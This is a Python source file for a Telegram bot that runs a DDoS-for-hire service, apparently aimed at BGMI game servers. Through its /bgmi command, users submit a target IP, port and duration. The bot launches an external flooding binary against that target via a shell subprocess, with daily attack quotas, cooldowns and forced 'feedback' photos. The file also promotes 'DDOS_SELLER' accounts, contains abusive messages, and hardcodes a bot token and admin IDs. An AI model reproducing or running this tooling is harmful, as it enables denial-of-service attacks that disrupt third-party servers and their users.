import os
import telebot
import logging
import asyncio
from datetime import datetime, timedelta, timezone

# Initialize logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# Telegram bot token and channel ID
TOKEN = '7913160168:AAH-Zd0cXjUhhb2JufOtn1I2428ANTE2dnQ'  # Replace with your actual bot token
CHANNEL_ID = '-1002313722798'  # Replace with your specific channel or group ID
# Initialize the bot
bot = telebot.TeleBot(TOKEN)

# Dictionary to store users who interacted with the bot
active_users = set()

# Dictionary to track user attack counts, cooldowns, photo feedbacks, and bans
user_attacks = {}
user_cooldowns = {}
user_photos = {}  # Tracks whether a user has sent a photo as feedback
user_bans = {}  # Tracks user ban status and ban expiry time
reset_time = datetime.now().astimezone(timezone(timedelta(hours=5, minutes=30))).replace(hour=0, minute=0, second=0, microsecond=0)

# Cooldown duration (in seconds)
COOLDOWN_DURATION = 60  # 5 minutes
BAN_DURATION = timedelta(minutes=1)  
DAILY_ATTACK_LIMIT = 20  # Daily attack limit per user

# List of Blocked Ports
BLOCKED_PORTS = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Add any ports you want to block
{}
# List of Admins who can use broadcast (Replace with actual admin user IDs)
ADMINS = [5579438195, 5579438195]  # Replace with your actual Telegram user IDs

# List of user IDs exempted from cooldown, limits, and photo requirements
EXEMPTED_USERS = [5579438195, 5579438195]

def reset_daily_counts():
    """Reset the daily attack counts and other data at 12 AM IST."""
    global reset_time
    ist_now = datetime.now(timezone.utc).astimezone(timezone(timedelta(hours=5, minutes=30)))
    if ist_now >= reset_time + timedelta(days=1):
        user_attacks.clear()
        user_cooldowns.clear()
        user_photos.clear()
        user_bans.clear()
        reset_time = ist_now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)


# Function to validate IP address
def is_valid_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in parts)

# Function to validate port number
def is_valid_port(port):
    return port.isdigit() and 0 <= int(port) <= 65535

# Function to validate duration
def is_valid_duration(duration):
    return duration.isdigit() and int(duration) > 0

@bot.message_handler(commands=['start', 'help'])
def start_message(message):
    """Registers users who interact with the bot."""
    user_id = message.from_user.id
    active_users.add(user_id)
    bot.send_message(message.chat.id, "⚠️⚠️ 𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲 ⚠️⚠️ 𝗰𝗼𝗺𝗲 𝗶𝗻 𝗴𝗿𝗼𝘂𝗽 :- @DDOS_SELLER_14")

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    """Sends a broadcast message to all users in active_users."""
    user_id = message.from_user.id
    
    # Ensure only admins can use this command
    if user_id not in ADMINS:
        bot.send_message(message.chat.id, "⚠️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘁𝗼 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗵𝗲𝗿𝗲")
        return

    # Extract the broadcast message text
    broadcast_text = message.text.replace("/broadcast", "").strip()
    
    if not broadcast_text:
        bot.send_message(message.chat.id, "⚠️ Please provide a message to broadcast. Usage: `/broadcast Your message here`")
        return

    # Send the broadcast message to all active users
    success_count = 0
    for user in active_users:
        try:
            bot.send_message(user, f"📢 𝙄𝙢𝙥𝙤𝙧𝙩𝙖𝙣𝙩 𝙉𝙤𝙩𝙞𝙘𝙚: {broadcast_text}")
            success_count += 1
        except Exception as e:
            logging.error(f"Failed to send message to {user}: {e}")

    bot.send_message(message.chat.id, f"✅ Broadcast sent to {success_count} users!")

@bot.message_handler(commands=['remain'])
def check_remaining_attacks(message):
    """Checks and returns the remaining attack count for the user."""
    user_id = message.from_user.id

    # If user is exempted, they have unlimited attacks
    if user_id in EXEMPTED_USERS:
        bot.send_message(message.chat.id, "✅ You have *Unlimited* attacks remaining today!")
        return

    # Get user's used attacks and calculate remaining
    used_attacks = user_attacks.get(user_id, 0)
    remaining_attacks = max(DAILY_ATTACK_LIMIT - used_attacks, 0)

    bot.send_message(message.chat.id, f"🔥 𝘿𝙖𝙞𝙡𝙮 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙞𝙢𝙞𝙩 𝙍𝙚𝙢𝙖𝙞𝙣𝙞𝙣𝙜 {remaining_attacks} 𝘼𝙩𝙩𝙖𝙘𝙠 𝙇𝙚𝙛𝙩 𝙏𝙤𝙙𝙖𝙮! ⚡")

# Handler for photos sent by users
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"  # Get first name or use "User" as default
    
    # Mark feedback as received
    user_photos[user_id] = True  
    
    # Send confirmation message with user's first name
    bot.send_message(message.chat.id, f"📸 𝙁𝙀𝙀𝘿𝘽𝙖𝘾𝙆 𝙍𝙚𝘾𝙀𝙄𝙑𝙚𝘿 𝙁𝙍𝙤𝙈 𝙐𝙎𝙚𝙍 {user_name} , 𝙉𝙤𝙬 𝙔𝙤𝙪 𝘾𝙖𝙣 𝘿𝙤 𝘼𝙣𝙤𝙩𝙝𝙚𝙧 𝘼𝙩𝙩𝙖𝙘𝙠 ")

@bot.message_handler(commands=['bgmi'])
def bgmi_command(message):
    global user_attacks, user_cooldowns, user_photos, user_bans
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "Unknown"

    # Ensure the bot only works in the specified channel or group
    if str(message.chat.id) != CHANNEL_ID:
        bot.send_message(message.chat.id, " 👍🏿𝗔𝗕𝗘 𝗠𝗔𝗗𝗔𝗥𝗖𝗛𝗢𝗗 𝗚𝗥𝗢𝗨𝗣 𝗣𝗔 𝗔𝗔𝗡𝗔 💀 \n\n[ 𝗕𝗢𝗧 𝗠𝗔𝗗𝗘 𝗕𝗬 : @DDOS_SELLER_1 ( TUMHARE_PAPA ) | 𝗗𝗠 𝗙𝗢𝗥 𝗥𝗘𝗕𝗥𝗔𝗡𝗗𝗜𝗡𝗚 ]")
        return

    # Reset counts daily
    reset_daily_counts()

    # Check if the user is banned
    if user_id in user_bans:
        ban_expiry = user_bans[user_id]
        if datetime.now() < ban_expiry:
            remaining_ban_time = (ban_expiry - datetime.now()).total_seconds()
            minutes, seconds = divmod(remaining_ban_time, 60)
            bot.send_message(
                message.chat.id,
                f"⚠️⚠️ 𝙃𝙞 {message.from_user.first_name}, 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙤𝙧 𝙣𝙤𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙞𝙣𝙜 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {int(minutes)} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {int(seconds)} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 !  ⚠️⚠️"
            )
            return
        else:
            del user_bans[user_id]  # Remove ban after expiry

    # Check if user is exempted from cooldowns, limits, and feedback requirements
    if user_id not in EXEMPTED_USERS:
        # Check if user is in cooldown
        if user_id in user_cooldowns:
            cooldown_time = user_cooldowns[user_id]
            if datetime.now() < cooldown_time:
                remaining_time = (cooldown_time - datetime.now()).seconds
                bot.send_message(
                    message.chat.id,
                    f"⚠️ {message.from_user.first_name}, 𝙮𝙤𝙪 𝙖𝙧𝙚 𝙘𝙪𝙧𝙧𝙚𝙣𝙩𝙡𝙮 𝙤𝙣 𝙘𝙤𝙤𝙡𝙙𝙤𝙬𝙣. 𝙋𝙡𝙚𝙖𝙨𝙚 𝙬𝙖𝙞𝙩 {remaining_time // 60} 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 𝙖𝙣𝙙 {remaining_time % 60} 𝙨𝙚𝙘𝙤𝙣𝙙𝙨 𝙗𝙚𝙛𝙤𝙧𝙚 𝙩𝙧𝙮𝙞𝙣𝙜 𝙖𝙜𝙖𝙞𝙣 ⚠️⚠️ "
                )
                return

        # Check attack count
        if user_id not in user_attacks:
            user_attacks[user_id] = 0

        if user_attacks[user_id] >= DAILY_ATTACK_LIMIT:
            bot.send_message(
                message.chat.id,
                f" {message.from_user.first_name}, 𝙮𝙤𝙪 𝙝𝙖𝙫𝙚 𝙧𝙚𝙖𝙘𝙝𝙚𝙙 𝙩𝙝𝙚 𝙢𝙖𝙭𝙞𝙢𝙪𝙢 𝙣𝙪𝙢𝙗𝙚𝙧 𝙤𝙛 𝙖𝙩𝙩𝙖𝙘𝙠-𝙡𝙞𝙢𝙞𝙩 𝙛𝙤𝙧 𝙩𝙤𝙙𝙖𝙮, 𝘾𝙤𝙢𝙚𝘽𝙖𝙘𝙠 𝙏𝙤𝙢𝙤𝙧𝙧𝙤𝙬 ✌️"
            )
            return

        # Check if the user has provided feedback after the last attack
        if user_id in user_attacks and user_attacks[user_id] > 0 and not user_photos.get(user_id, False):
            user_bans[user_id] = datetime.now() + BAN_DURATION  # Ban user for 2 hours
            bot.send_message(
                message.chat.id,
                f" {message.from_user.first_name}, ⚠️⚠️𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙 𝙛𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝙖𝙛𝙩𝙚𝙧 𝙮𝙤𝙪𝙧 𝙡𝙖𝙨𝙩 𝙖𝙩𝙩𝙖𝙘𝙠. 𝙔𝙤𝙪 𝙖𝙧𝙚 𝙗𝙖𝙣𝙣𝙚𝙙 𝙛𝙧𝙤𝙢 𝙪𝙨𝙞𝙣𝙜 𝙩𝙝𝙞𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙 𝙛𝙤𝙧 30 𝙢𝙞𝙣𝙪𝙩𝙚𝙨 ⚠️⚠️"
            )
            return

    # Split the command to get parameters
    try:
        args = message.text.split()[1:]  # Skip the command itself
        logging.info(f"Received arguments: {args}")

        if len(args) != 3:
            raise ValueError("♦️ 𝐈𝐆𝐍𝐈𝐓𝐄_𝐗_𝐒𝐀𝐉𝐀𝐓𝐇™ 𝗕𝗢𝗧 𝙍𝙚𝙖𝙙𝙮 𝙛𝙤𝙧 𝙐𝙨𝙚 ♦️\n\n ❂ 𝙐𝙨𝙚 𝙩𝙝𝙚 𝙘𝙤𝙧𝙧𝙚𝙘𝙩 𝙛𝙤𝙧𝙢𝙖𝙩\n /𝗯𝗴𝗺𝗶 <𝘁𝗮𝗿𝗴𝗲𝘁_𝗶𝗽> <𝘁𝗮𝗿𝗴𝗲𝘁_𝗽𝗼𝗿𝘁> <𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻> ")

        target_ip, target_port, user_duration = args

        # Validate inputs
        if not is_valid_ip(target_ip):
            raise ValueError("❌ Invalid IP address.")
        if not is_valid_port(target_port):
            raise ValueError("❌ Invalid port number.")
        if not is_valid_duration(user_duration):
            raise ValueError("❌ Invalid duration. Must be a positive integer.")

        # Convert port to integer and check if it's blocked
        target_port = int(target_port)
        if target_port in BLOCKED_PORTS:
            bot.send_message(message.chat.id, f"🚫𝘽𝙡𝙤𝙘𝙠𝙚𝙙 𝙋𝙤𝙧𝙩 {target_port} 𝙋𝙡𝙚𝙖𝙨𝙚 𝙀𝙣𝙩𝙚𝙧 𝙏𝙝𝙚 𝙑𝙖𝙡𝙞𝙙 𝙋𝙤𝙧𝙩 𝙉𝙪𝙢𝙗𝙚𝙧")
            return
        # Increment attack count for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_attacks[user_id] += 1
            user_photos[user_id] = False  # Reset photo feedback requirement

        # Set cooldown for non-exempted users
        if user_id not in EXEMPTED_USERS:
            user_cooldowns[user_id] = datetime.now() + timedelta(seconds=COOLDOWN_DURATION)

        # Notify that the attack will run for the default duration of 150 seconds, but display the input duration
        default_duration = 150
        bot.send_message(
            message.chat.id,
            f"♦️ 𝙃𝙚𝙮 {message.from_user.first_name}, 𝘼𝙩𝙩𝙖𝙘𝙠 𝙄𝙣𝙞𝙩𝙞𝙖𝙩𝙚𝙙 𝙊𝙣 {target_ip} : {target_port} 𝙁𝙤𝙧 {default_duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨 [𝙐𝙨𝙚𝙧 𝙍𝙚𝙦𝙪𝙚𝙨𝙩𝙚𝙙 {user_duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨]\n\n♦️𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙪𝙡𝙨𝙤𝙧𝙮 𝙊𝙩𝙝𝙚𝙧𝙬𝙞𝙨𝙚 𝙮𝙤𝙪'𝙧𝙚 𝘽𝙖𝙣♦️"
        )
        
        # Log the attack started message
        logging.info(f"Attack started by {user_name}: ./sahil {target_ip} {target_port} {default_duration} 150")

        # Run the attack command with the default duration and pass the user-provided duration for the finish message
        asyncio.run(run_attack_command_async(target_ip, int(target_port), default_duration, user_duration, user_name))

    except Exception as e:
        bot.send_message(message.chat.id, str(e))

async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./sahil {target_ip} {target_port} {duration} 150"
        process = await asyncio.create_subprocess_shell(command)
        await process.communicate()
        bot.send_message(CHANNEL_ID, f"🎉 𝘼𝙩𝙩𝙖𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚 𝙎𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮 𝙊𝙣 {target_ip}:{target_port} 𝙛𝙤𝙧 {user_duration} 𝙎𝙚𝙘𝙤𝙣𝙙𝙨\n\n⚡𝙏𝙝𝙖𝙣𝙠𝙮𝙤𝙪 𝙁𝙤𝙧 𝙐𝙨𝙞𝙣𝙜 𝙊𝙪𝙧 𝙎𝙚𝙧𝙫𝙞𝙘𝙚. 𝙔𝙤𝙪𝙧 𝙄𝙣𝙩𝙚𝙧𝙣𝙚𝙩 𝙄𝙨 𝙉𝙤𝙧𝙢𝙖𝙡 𝙉𝙤𝙬 𝙔𝙤𝙪 𝘾𝙖𝙣 𝙎𝙚𝙣𝙙 𝙁𝙚𝙚𝙙𝙗𝙖𝙘𝙠⚡")
    except Exception as e:
        bot.send_message(CHANNEL_ID, f"Error running attack command: {e}")

# Start the bot
if __name__ == "__main__":
    logging.info("Bot is starting...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")